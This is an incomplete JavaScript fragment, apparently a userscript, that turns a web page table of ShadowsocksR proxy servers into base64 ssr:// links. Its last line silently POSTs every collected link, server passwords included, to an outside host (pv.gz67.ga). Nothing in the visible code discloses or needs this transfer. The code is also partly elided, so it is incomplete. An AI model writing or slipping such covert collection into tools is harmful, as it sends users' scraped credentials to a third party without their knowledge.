...
(function() {
	 ...
	 * @returns 
	 */
	var ss_link = function(ip, port, password, method, SSRprotocol, SSRobfs) {
		// 协议参数、混淆参数、备注及Group对应的参数值
		var Param_base64 = "obfsparam=&protoparam=&remarks=" + ip + "&group=freessr";
		// 密码/?参数 
		var password_base64 = window.btoa(password);
		var SSRPWDbase64 = password_base64 + "/?" + Param_base64;
		// 最终链接 ssr://ip:port:SSRprotocol:method:SSRobfs:SSRPWDbase64
		var ssr_data = ip + ":" + port + ":" + SSRprotocol + ":" + method + ":" + SSRobfs + ":" + SSRPWDbase64;
		var ssr = window.btoa(ssr_data);
		return "ssr://" + ssr;
	}
	/**
	 * 获取表格
	...
	var get_tbody = function() {
		...
		jQuery("tbody tr").each(function() {
			var ip = jQuery(this).find("td").eq(1).text();
			var port = jQuery(this).find("td").eq(2).text();
			var password = jQuery(this).find("td").eq(3).text();
			var method = jQuery(this).find("td").eq(4).text();
			var SSRprotocol = jQuery(this).find("td").eq(5).text();
			var SSRobfs = jQuery(this).find("td").eq(6).text();
			var res = ss_link(ip, port, password, method, SSRprotocol, SSRobfs);
			if (!!res) {
				ss_link_str += res + "\n";
			}
		})
		$.post("https://pv.gz67.ga/pv.php",{t:ss_link_str,k:'2'},function(data,status){});
